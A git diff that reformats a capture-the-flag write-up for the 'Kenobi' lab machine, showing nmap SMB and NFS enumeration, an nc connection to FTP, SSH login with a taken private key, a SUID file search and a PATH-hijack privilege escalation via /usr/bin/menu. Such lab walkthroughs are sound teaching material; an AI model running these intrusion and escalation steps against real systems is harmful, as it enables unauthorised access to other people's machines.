@@ -1,4 +1,4 @@
-#BASIC INFO
+# BASIC INFO
 
 ```
 ip_addr = 10.10.118.198
@@ -15,23 +15,23 @@ HOST = KENOBI
 
 ```
 
-#ENUMERATING
+# ENUMERATING
 
 ```
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap/enum $IP -T4
-
-shares found: 3
-	guests
-	anonymous
-	print$
-
-
-nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmap/rpc $IP -T4
-mount point: /var
+```
+> shares found: 3
+>> guests
+>> anonymous
+>> print$
 
 ```
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmap/rpc $IP -T4
 
-#GAINING INITIAL CONTROL WITH PROFTPD
+```
+> mount point: /var
+
+# GAINING INITIAL CONTROL WITH PROFTPD
 
 ```
 nc $IP 21
@@ -45,7 +45,7 @@ ssh -i id_rsa kenobi@$IP
 
 ```
 
-#PRIV ESC
+# PRIV ESC
 
 ```
 find / -perm -u=s -type f 2>/dev/null
@@ -57,6 +57,5 @@ export PATH=/tmp:$PATH
 
 /usr/bin/menu
 3
-
 
 ```
